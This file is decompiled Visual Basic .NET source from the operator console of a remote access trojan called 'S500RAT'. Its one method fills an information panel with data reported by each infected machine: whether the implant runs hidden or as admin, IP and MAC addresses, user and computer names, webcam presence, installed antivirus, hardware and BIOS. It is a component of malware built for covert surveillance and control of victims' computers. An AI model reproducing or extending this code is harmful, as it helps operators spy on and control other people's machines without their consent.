Imports System
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x0200004F RID: 79
	Public Class FrmInformation
		' Token: 0x06001193 RID: 4499 RVA: 0x00099EE8 File Offset: 0x000980E8
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim formInformation As FormInformation = CType(Application.OpenForms("FormInformation" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormInformation)
				Dim flag As Boolean = formInformation IsNot Nothing
				If flag Then
					Dim flag2 As Boolean = formInformation.Client Is Nothing
					If flag2 Then
						formInformation.Client = client
						formInformation.Timer1.Enabled = True
					End If
					formInformation.ListNode.Nodes(0).Nodes(0).Text = "Name : " + unpack_msgpack.ForcePathObject("NameClient").AsString
					formInformation.ListNode.Nodes(0).Nodes(1).Text = "Installation Path :" + unpack_msgpack.ForcePathObject("PathClient").AsString
					formInformation.ListNode.Nodes(0).Nodes(2).Text = "Admin : " + unpack_msgpack.ForcePathObject("Admin").AsString.Replace("True", "Yes").Replace("False", "No")
					formInformation.ListNode.Nodes(0).Nodes(3).Text = "Hidden : " + unpack_msgpack.ForcePathObject("Hidden").AsString
					formInformation.ListNode.Nodes(0).Nodes(4).Text = "Date Installed : " + unpack_msgpack.ForcePathObject("DataInstall").AsString
					formInformation.ListNode.Nodes(0).Expand()
					formInformation.ListNode.Nodes(1).Nodes(0).Text = "IP : " + unpack_msgpack.ForcePathObject("IP").AsString
					formInformation.ListNode.Nodes(1).Nodes(1).Text = "Port :" + unpack_msgpack.ForcePathObject("Port").AsString
					formInformation.ListNode.Nodes(1).Nodes(2).Text = "IPV4 : " + unpack_msgpack.ForcePathObject("IPV4").AsString
					formInformation.ListNode.Nodes(1).Nodes(3).Text = "MAC : " + unpack_msgpack.ForcePathObject("MAC").AsString
					formInformation.ListNode.Nodes(1).Expand()
					formInformation.ListNode.Nodes(2).Nodes(0).Text = "Computer Name : " + unpack_msgpack.ForcePathObject("PCname").AsString
					formInformation.ListNode.Nodes(2).Nodes(1).Text = "UserDomainName : " + unpack_msgpack.ForcePathObject("UserDomainName").AsString
					formInformation.ListNode.Nodes(2).Nodes(2).Text = "UserName : " + unpack_msgpack.ForcePathObject("UserName").AsString
					formInformation.ListNode.Nodes(2).Nodes(3).Text = "Monitor : " + unpack_msgpack.ForcePathObject("MonitorCount").AsString
					formInformation.ListNode.Nodes(2).Nodes(4).Text = "Screen Sizes : " + unpack_msgpack.ForcePathObject("PCScreen").AsString
					formInformation.ListNode.Nodes(2).Nodes(5).Text = "Windows : " + unpack_msgpack.ForcePathObject("OsFullName").AsString
					formInformation.ListNode.Nodes(2).Nodes(6).Text = "OS : " + unpack_msgpack.ForcePathObject("OSPlatform").AsString
					formInformation.ListNode.Nodes(2).Nodes(7).Text = "OSVersion : " + unpack_msgpack.ForcePathObject("OsFullVirsion").AsString
					formInformation.ListNode.Nodes(2).Nodes(8).Text = "RAM : " + Functions.BytesToSize(Conversions.ToLong(unpack_msgpack.ForcePathObject("RAM").AsString))
					formInformation.ListNode.Nodes(2).Nodes(9).Text = "CPU :" + unpack_msgpack.ForcePathObject("CPU").AsString
					formInformation.ListNode.Nodes(2).Nodes(10).Text = "GPU : " + unpack_msgpack.ForcePathObject("GPU").AsString
					formInformation.ListNode.Nodes(2).Nodes(11).Text = "Battery : " + unpack_msgpack.ForcePathObject("Battery").AsString
					formInformation.ListNode.Nodes(2).Nodes(12).Text = "Computer Started time : " + unpack_msgpack.ForcePathObject("PCTimes").AsString
					formInformation.ListNode.Nodes(2).Nodes(13).Text = "Date :" + unpack_msgpack.ForcePathObject("DataHoras").AsString
					formInformation.ListNode.Nodes(2).Nodes(14).Text = "Cam : " + unpack_msgpack.ForcePathObject("CAM").AsString.Replace("True", "Yes").Replace("False", "No")
					formInformation.ListNode.Nodes(2).Nodes(15).Text = "System Directory : " + unpack_msgpack.ForcePathObject("Dir_System").AsString
					formInformation.ListNode.Nodes(2).Nodes(16).Text = "AV : " + unpack_msgpack.ForcePathObject("AV").AsString
					formInformation.ListNode.Nodes(2).Nodes(17).Text = "System Model : " + unpack_msgpack.ForcePathObject("SystemModel").AsString
					formInformation.ListNode.Nodes(2).Nodes(18).Text = "BIOS : " + unpack_msgpack.ForcePathObject("BIOS").AsString
					formInformation.ListNode.Nodes(2).Expand()
				End If
			Catch ex As Exception
			End Try
		End Sub
	End Class
End Namespace
